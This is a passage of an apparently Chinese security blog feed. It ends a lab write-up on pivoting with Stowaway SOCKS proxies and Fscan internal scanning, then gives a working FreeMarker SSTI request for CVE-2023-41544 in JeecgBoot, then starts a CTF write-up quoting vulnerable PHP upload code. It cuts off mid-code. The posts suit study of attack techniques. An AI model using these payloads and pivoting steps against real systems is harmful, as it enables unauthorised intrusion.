class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 27655  bytes 8040046 (8.0 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 27655  bytes 8040046 (8.0 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">veth0eeff78: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet6 fe80::60fc:52ff:fea9:61d7  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 62:fc:52:a9:61:d7  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 797  bytes 47767 (47.7 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 820  bytes 49617 (49.6 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p><a href="https://github.com/ph4ntonn/Stowaway">ph4ntonn&#x2F;Stowaway：👻Stowaway ——渗透测试者的多跳代理工具</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -lntp</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765632376470-4b93f6f0-10b2-40ac-b295-f66a0c56f42e.jpg" alt="null"><br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765632376575-be60ed5e-fc03-4079-ae2c-0a7a3f9803a9.jpg" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#（靶机web01执行）</span><br><span class="line">root@web01:/# chmod +x linux_x64_agent </span><br><span class="line">root@web01:/# ./linux_x64_agent -l 22</span><br><span class="line">2025/11/15 02:25:19 [*] Starting agent node passively.Now listening on port 22  </span><br><span class="line"></span><br><span class="line">#(你的VPS执行)</span><br><span class="line"># ./linux_x64_admin -c $靶机IP:22  </span><br><span class="line">(admin) &gt;&gt; use 0</span><br><span class="line">(node 0) &gt;&gt; socks 9999</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765632376728-b45a1823-7661-4a87-9cd9-3190c4bef8fa.jpg" alt="null"></p><p>这样就行搭好代理了，可以通过 vpsIP:9999 作为跳板访问到内网10网段 在kali上配置 &#x2F;etc&#x2F;proxychains4.conf 通过proxychains来使用代理</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765632376810-d11f2f13-dd65-44af-af8a-11e95ba811f9.jpg" alt="null"></p><p>windows上使用proxyfier配置来使用代理 (地址为你的vps IP)</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765632376924-5758cd2b-6718-4b0c-88bf-e5f1f68221a5.jpg" alt="null"></p><h2 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h2><p>上传Fscan到web01对内网10网段进行扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">root@web01:/root# ./FScan_2.0.1_linux_x64  -h 172.22.10.22/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.1</span><br><span class="line"></span><br><span class="line">[1.8s]     已选择服务扫描模式</span><br><span class="line">[1.8s]     开始信息扫描</span><br><span class="line">[1.8s]     CIDR范围: 172.22.10.0-172.22.10.255</span><br><span class="line">[1.8s]     generate_ip_range_full</span><br><span class="line">[1.8s]     解析CIDR 172.22.10.22/24 -&gt; IP范围 172.22.10.0-172.22.10.255</span><br><span class="line">[1.9s]     最终有效主机数量: 256</span><br><span class="line">[1.9s]     开始主机扫描</span><br><span class="line">[1.9s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle</span><br><span class="line">[1.9s] [*] 目标 172.22.10.22    存活 (ICMP)</span><br><span class="line">[1.9s] [*] 目标 172.22.10.17    存活 (ICMP)</span><br><span class="line">[1.9s] [*] 目标 172.22.10.253   存活 (ICMP)</span><br><span class="line">[1.9s] [*] 目标 172.22.10.88    存活 (ICMP)</span><br><span class="line">[4.9s]     存活主机数量: 4</span><br><span class="line">[4.9s]     有效端口数量: 233</span><br><span class="line">[4.9s] [*] 端口开放 172.22.10.22:6379</span><br><span class="line">[4.9s] [*] 端口开放 172.22.10.22:80</span><br><span class="line">[4.9s] [*] 端口开放 172.22.10.22:3306</span><br><span class="line">[4.9s] [*] 端口开放 172.22.10.22:8081</span><br><span class="line">[4.9s] [*] 端口开放 172.22.10.22:8080</span><br><span class="line">[4.9s] [*] 端口开放 172.22.10.17:22</span><br><span class="line">[4.9s] [*] 端口开放 172.22.10.88:21</span><br><span class="line">[4.9s] [*] 端口开放 172.22.10.88:80</span><br><span class="line">[4.9s] [*] 端口开放 172.22.10.88:445</span><br><span class="line">[4.9s] [*] 端口开放 172.22.10.88:139</span><br><span class="line">[4.9s] [*] 端口开放 172.22.10.88:135</span><br><span class="line">[7.9s]     扫描完成, 发现 11 个开放端口</span><br><span class="line">[7.9s]     存活端口数量: 11</span><br><span class="line">[7.9s]     开始漏洞扫描</span><br><span class="line">[7.9s] [*] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.10.88</span><br><span class="line">主机名: web02</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.10.88</span><br><span class="line">[7.9s] [*] 网站标题 http://172.22.10.22       状态码:200 长度:14323  标题:FinancePro ERP系统</span><br><span class="line">[8.0s] [+] NetBios 172.22.10.88    WORKGROUP\WEB02               </span><br><span class="line">[8.0s] [*] 网站标题 http://172.22.10.88       状态码:403 长度:199    标题:403 Forbidden</span><br><span class="line">[8.0s]     POC加载完成: 总共387个，成功387个，失败0个</span><br><span class="line">[8.1s] [+] FTP服务 172.22.10.88:21 匿名登录成功!</span><br><span class="line">[8.1s] [*] 网站标题 http://172.22.10.22:8080  状态码:404 长度:682    标题:HTTP Status 404 – Not Found</span><br><span class="line">[8.1s] [*] 网站标题 http://172.22.10.22:8081  状态码:200 长度:1766   标题:&quot;&quot;</span><br><span class="line">[36.6s]     扫描已完成: 18/18</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;春秋云镜Finance–外网打靶&lt;/p&gt;</summary>
    
    
    
    <category term="内网安全" scheme="https://flypigc.github.io/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="web安全" scheme="https://flypigc.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>JeecgBoot jmreport/loadTableData 接口 SSTI 漏洞--CVE-2023-41544</title>
    <link href="https://flypigc.github.io/2025/12/13/JeecgBoot%20jmreportloadTableDataSSTI%20%E6%BC%8F%E6%B4%9E--CVE-2023-41544/"/>
    <id>https://flypigc.github.io/2025/12/13/JeecgBoot%20jmreportloadTableDataSSTI%20%E6%BC%8F%E6%B4%9E--CVE-2023-41544/</id>
    <published>2025-12-13T13:22:53.793Z</published>
    <updated>2025-12-20T01:59:46.904Z</updated>
    
    <content type="html"><![CDATA[<p>JeecgBoot jmreport&#x2F;loadTableData 接口 SSTI 漏洞–CVE-2023-41544</p><span id="more"></span><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">POST /jmreport/queryFieldBySql HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> </span><br><span class="line">User-Agent<span class="punctuation">:</span> Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_15_7) AppleWebKit/<span class="number">537.36</span> (KHTML<span class="punctuation">,</span> like Gecko) Chrome/<span class="number">109.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">95</span></span><br><span class="line">Accept<span class="punctuation">:</span> *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;&quot;sql&quot;:&quot;select &#x27;&lt;#assign ex=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt; $&#123; ex(\&quot;pwd\&quot;) &#125;&#x27; &quot;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765544209612-161bd780-f189-47c2-a409-7c1f70862eaa.png" alt="img"></p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传参</span></span><br><span class="line">String userInputSql = request.getParam(<span class="string">&quot;sql&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化FreeMarker配置</span></span><br><span class="line">Configuration freeMarkerCfg = new Configuration(Configuration.VERSION_2_3_31);</span><br><span class="line"><span class="comment">//默认配置未禁用危险类解析</span></span><br><span class="line"><span class="comment">// freeMarkerCfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输入的sql作为FreeMarker模板内容</span></span><br><span class="line">Template template = new Template(</span><br><span class="line">    <span class="string">&quot;sqlTemplate&quot;</span><span class="punctuation">,</span></span><br><span class="line">    new StringReader(userInputSql)<span class="punctuation">,</span> <span class="comment">//用户输入的sql直接作为模板内容</span></span><br><span class="line">    freeMarkerCfg</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//渲染模板（输入的sql中的FreeMarker指令被执行）</span></span><br><span class="line">String renderedContent = FreeMarkerTemplateUtils.processTemplateIntoString(template<span class="punctuation">,</span> <span class="literal"><span class="keyword">null</span></span>);</span><br><span class="line"></span><br><span class="line">executeSql(renderedContent);</span><br></pre></td></tr></table></figure><p>实例化<code>Execute</code>类，得到可执行命令的<code>ex</code>对象</p><p>执行<code>$&#123;ex(&quot;ls&quot;)&#125;</code>：调用<code>ex</code>执行<code>ls</code>命令，获取服务器上<code>ls</code>的执行结果</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;JeecgBoot jmreport&amp;#x2F;loadTableData 接口 SSTI 漏洞–CVE-2023-41544&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://flypigc.github.io/categories/CVE/"/>
    
    
    <category term="web安全" scheme="https://flypigc.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Dest0g3 520-web</title>
    <link href="https://flypigc.github.io/2025/12/11/Dest0g3%20520-web/"/>
    <id>https://flypigc.github.io/2025/12/11/Dest0g3%20520-web/</id>
    <published>2025-12-11T08:36:33.492Z</published>
    <updated>2025-12-20T01:52:47.888Z</updated>
    
    <content type="html"><![CDATA[<p>Dest0g3 520-web</p><span id="more"></span><h2 id="ezip–就是文件上传提权"><a href="#ezip–就是文件上传提权" class="headerlink" title="ezip–就是文件上传提权"></a>ezip–就是文件上传提权</h2><p>010打开涩图发现后面又base64</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765440095824-e6b72719-ab8b-4c81-b3fd-beddff4b71ef.png" alt="img"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">dXBsb2FkLnBocDoKPD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwppbmNsdWRlKCJ6aXAucGhwIik7CmlmKGlzc2V0KCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSl7CiAgICBpZihzdHJzdHIoJF9GSUxFU1snZmlsZSddWyduYW1lJ10sIi4uIil8fHN0cnN0cigkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSwiLyIpKXsKICAgICAgICBlY2hvICJoYWNrZXIhISI7CiAgICAgICAgZXhpdDsKICAgIH0KICAgIGlmKHBhdGhpbmZvKCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddLCBQQVRISU5GT19FWFRFTlNJT04pIT0iemlwIil7CiAgICAgICAgZWNobyAib25seSB6aXAhISI7CiAgICAgICAgZXhpdDsKICAgIH0KICAgICRNeXppcCA9IG5ldyB6aXAoJF9GSUxFU1snZmlsZSddWyduYW1lJ10pOwogICAgbWtkaXIoJE15emlwLT5wYXRoKTsKICAgIG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICcuLycuJE15emlwLT5wYXRoLicvJyAuICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKTsKICAgIGVjaG8gIlRyeSB0byB1bnppcCB5b3VyIHppcCB0byAvIi4kTXl6aXAtPnBhdGguIjxicj4iOwogICAgaWYoJE15emlwLT51bnppcCgpKXtlY2hvICJTdWNjZXNzIjt9ZWxzZXtlY2hvICJmYWlsZWQiO30KfQoKemlwLnBocDoKPD9waHAKY2xhc3MgemlwCnsKICAgIHB1YmxpYyAkemlwX25hbWU7CiAgICBwdWJsaWMgJHBhdGg7CiAgICBwdWJsaWMgJHppcF9tYW5hZ2VyOwoKICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkemlwX25hbWUpewogICAgICAgICR0aGlzLT56aXBfbWFuYWdlciA9IG5ldyBaaXBBcmNoaXZlKCk7CiAgICAgICAgJHRoaXMtPnBhdGggPSAkdGhpcy0+Z2VuX3BhdGgoKTsKICAgICAgICAkdGhpcy0+emlwX25hbWUgPSAkemlwX25hbWU7CiAgICB9CiAgICBwdWJsaWMgZnVuY3Rpb24gZ2VuX3BhdGgoKXsKICAgICAgICAkY2hhcnM9ImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5IjsKICAgICAgICAkbmV3Y2hhcnM9c3RyX3NwbGl0KCRjaGFycyk7CiAgICAgICAgc2h1ZmZsZSgkbmV3Y2hhcnMpOwogICAgICAgICRjaGFyc19rZXk9YXJyYXlfcmFuZCgkbmV3Y2hhcnMsMTUpOwogICAgICAgICRmbnN0ciA9ICIiOwogICAgICAgIGZvcigkaT0wOyRpPDE1OyRpKyspewogICAgICAgICAgICAkZm5zdHIuPSRuZXdjaGFyc1skY2hhcnNfa2V5WyRpXV07CiAgICAgICAgfQogICAgICAgIHJldHVybiBtZDUoJGZuc3RyLnRpbWUoKS5taWNyb3RpbWUoKSoxMDAwMDApOwogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBkZWxkaXIoJGRpcikgewogICAgICAgIC8v5YWI5Yig6Zmk55uu5b2V5LiL55qE5paH5Lu277yaCiAgICAgICAgJGRoID0gb3BlbmRpcigkZGlyKTsKICAgICAgICB3aGlsZSAoJGZpbGUgPSByZWFkZGlyKCRkaCkpIHsKICAgICAgICAgICAgaWYoJGZpbGUgIT0gIi4iICYmICRmaWxlIT0iLi4iKSB7CiAgICAgICAgICAgICAgICAkZnVsbHBhdGggPSAkZGlyLiIvIi4kZmlsZTsKICAgICAgICAgICAgICAgIGlmKCFpc19kaXIoJGZ1bGxwYXRoKSkgewogICAgICAgICAgICAgICAgICAgIHVubGluaygkZnVsbHBhdGgpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZGVsZGlyKCRmdWxscGF0aCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgY2xvc2VkaXIoJGRoKTsKICAgIH0KICAgIGZ1bmN0aW9uIGRpcl9saXN0KCRkaXJlY3RvcnkpCiAgICB7CiAgICAgICAgJGFycmF5ID0gW107CgogICAgICAgICRkaXIgPSBkaXIoJGRpcmVjdG9yeSk7CiAgICAgICAgd2hpbGUgKCRmaWxlID0gJGRpci0+cmVhZCgpKSB7CiAgICAgICAgICAgIGlmICgkZmlsZSAhPT0gJy4nICYmICRmaWxlICE9PSAnLi4nKSB7CiAgICAgICAgICAgICAgICAkYXJyYXlbXSA9ICRmaWxlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYXJyYXk7CiAgICB9CiAgICBwdWJsaWMgZnVuY3Rpb24gdW56aXAoKQogICAgewogICAgICAgICRmdWxscGF0aCA9ICIvdmFyL3d3dy9odG1sLyIuJHRoaXMtPnBhdGguIi8iLiR0aGlzLT56aXBfbmFtZTsKICAgICAgICAkd2hpdGVfbGlzdCA9IFsnanBnJywncG5nJywnZ2lmJywnYm1wJ107CiAgICAgICAgJHRoaXMtPnppcF9tYW5hZ2VyLT5vcGVuKCRmdWxscGF0aCk7CiAgICAgICAgZm9yICgkaSA9IDA7JGkgPCAkdGhpcy0+emlwX21hbmFnZXItPmNvdW50KCk7JGkgKyspIHsKICAgICAgICAgICAgaWYgKHN0cnN0cigkdGhpcy0+emlwX21hbmFnZXItPmdldE5hbWVJbmRleCgkaSksIi4uLyIpKXsKICAgICAgICAgICAgICAgIGVjaG8gInlvdSBiYWQgYmFkIjsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZighJHRoaXMtPnppcF9tYW5hZ2VyLT5leHRyYWN0VG8oJHRoaXMtPnBhdGgpKXsKICAgICAgICAgICAgZWNobyAiVW56aXAgdG8gLyIuJHRoaXMtPnBhdGguIi8gZmFpbGVkIjsKICAgICAgICAgICAgZXhpdDsKICAgICAgICB9CiAgICAgICAgQHVubGluaygkZnVsbHBhdGgpOwogICAgICAgICRmaWxlX2xpc3QgPSAkdGhpcy0+ZGlyX2xpc3QoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIpOwogICAgICAgIGZvcigkaT0wOyRpPHNpemVvZigkZmlsZV9saXN0KTskaSsrKXsKICAgICAgICAgICAgaWYoaXNfZGlyKCR0aGlzLT5wYXRoLiIvIi4kZmlsZV9saXN0WyRpXSkpewogICAgICAgICAgICAgICAgZWNobyAiZGlyPyBJIGRlbGV0ZWQgYWxsIHRoaW5ncyBpbiBpdCIuIjxicj4iO0AkdGhpcy0+ZGVsZGlyKCIvdmFyL3d3dy9odG1sLyIuJHRoaXMtPnBhdGguIi8iLiRmaWxlX2xpc3RbJGldKTtAcm1kaXIoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIuJGZpbGVfbGlzdFskaV0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICBpZighaW5fYXJyYXkocGF0aGluZm8oJGZpbGVfbGlzdFskaV0sIFBBVEhJTkZPX0VYVEVOU0lPTiksJHdoaXRlX2xpc3QpKSB7ZWNobyAib25seSBpbWFnZSEhISBJIGRlbGV0ZWQgaXQgZm9yIHlvdSIuIjxicj4iO0B1bmxpbmsoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIuJGZpbGVfbGlzdFskaV0pO30KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gdHJ1ZTsKCiAgICB9CgoKfQo=</span><br><span class="line">#upload.php<span class="punctuation">:</span></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">include(<span class="string">&quot;zip.php&quot;</span>);</span><br><span class="line">if(isset($_FILES<span class="punctuation">[</span>&#x27;file&#x27;<span class="punctuation">]</span><span class="punctuation">[</span>&#x27;name&#x27;<span class="punctuation">]</span>))<span class="punctuation">&#123;</span></span><br><span class="line">    if(strstr($_FILES<span class="punctuation">[</span>&#x27;file&#x27;<span class="punctuation">]</span><span class="punctuation">[</span>&#x27;name&#x27;<span class="punctuation">]</span><span class="punctuation">,</span><span class="string">&quot;..&quot;</span>)||strstr($_FILES<span class="punctuation">[</span>&#x27;file&#x27;<span class="punctuation">]</span><span class="punctuation">[</span>&#x27;name&#x27;<span class="punctuation">]</span><span class="punctuation">,</span><span class="string">&quot;/&quot;</span>))<span class="punctuation">&#123;</span></span><br><span class="line">        echo <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">        exit;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">    if(pathinfo($_FILES<span class="punctuation">[</span>&#x27;file&#x27;<span class="punctuation">]</span><span class="punctuation">[</span>&#x27;name&#x27;<span class="punctuation">]</span><span class="punctuation">,</span> PATHINFO_EXTENSION)!=<span class="string">&quot;zip&quot;</span>)<span class="punctuation">&#123;</span></span><br><span class="line">        echo <span class="string">&quot;only zip!!&quot;</span>;</span><br><span class="line">        exit;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">    $Myzip = new zip($_FILES<span class="punctuation">[</span>&#x27;file&#x27;<span class="punctuation">]</span><span class="punctuation">[</span>&#x27;name&#x27;<span class="punctuation">]</span>);</span><br><span class="line">    mkdir($Myzip-&gt;path);</span><br><span class="line">    move_uploaded_file($_FILES<span class="punctuation">[</span>&#x27;file&#x27;<span class="punctuation">]</span><span class="punctuation">[</span>&#x27;tmp_name&#x27;<span class="punctuation">]</span><span class="punctuation">,</span> &#x27;./&#x27;.$Myzip-&gt;path.&#x27;/&#x27; . $_FILES<span class="punctuation">[</span>&#x27;file&#x27;<span class="punctuation">]</span><span class="punctuation">[</span>&#x27;name&#x27;<span class="punctuation">]</span>);</span><br><span class="line">    echo <span class="string">&quot;Try to unzip your zip to /&quot;</span>.$Myzip-&gt;path.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    if($Myzip-&gt;unzip())<span class="punctuation">&#123;</span>echo <span class="string">&quot;Success&quot;</span>;<span class="punctuation">&#125;</span>else<span class="punctuation">&#123;</span>echo <span class="string">&quot;failed&quot;</span>;<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">#zip.php<span class="punctuation">:</span></span><br><span class="line">&lt;?php</span><br><span class="line">class zip</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    public $zip_name;</span><br><span class="line">    public $path;</span><br><span class="line">    public $zip_manager;</span><br><span class="line"></span><br><span class="line">    public function __construct($zip_name)<span class="punctuation">&#123;</span></span><br><span class="line">        $this-&gt;zip_manager = new ZipArchive();</span><br><span class="line">        $this-&gt;path = $this-&gt;gen_path();</span><br><span class="line">        $this-&gt;zip_name = $zip_name;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">    public function gen_path()<span class="punctuation">&#123;</span></span><br><span class="line">        $chars=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">        $newchars=str_split($chars);</span><br><span class="line">        shuffle($newchars);</span><br><span class="line">        $chars_key=array_rand($newchars<span class="punctuation">,</span><span class="number">15</span>);</span><br><span class="line">        $fnstr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        for($i=<span class="number">0</span>;$i&lt;<span class="number">15</span>;$i++)<span class="punctuation">&#123;</span></span><br><span class="line">            $fnstr.=$newchars<span class="punctuation">[</span>$chars_key<span class="punctuation">[</span>$i<span class="punctuation">]</span><span class="punctuation">]</span>;</span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">        return md5($fnstr.time().microtime()*<span class="number">100000</span>);</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    public function deldir($dir) <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="comment">//先删除目录下的文件：</span></span><br><span class="line">        $dh = opendir($dir);</span><br><span class="line">        while ($file = readdir($dh)) <span class="punctuation">&#123;</span></span><br><span class="line">            if($file != <span class="string">&quot;.&quot;</span> &amp;&amp; $file!=<span class="string">&quot;..&quot;</span>) <span class="punctuation">&#123;</span></span><br><span class="line">                $fullpath = $dir.<span class="string">&quot;/&quot;</span>.$file;</span><br><span class="line">                if(!is_dir($fullpath)) <span class="punctuation">&#123;</span></span><br><span class="line">                    unlink($fullpath);</span><br><span class="line">                <span class="punctuation">&#125;</span> else <span class="punctuation">&#123;</span></span><br><span class="line">                    $this-&gt;deldir($fullpath);</span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">        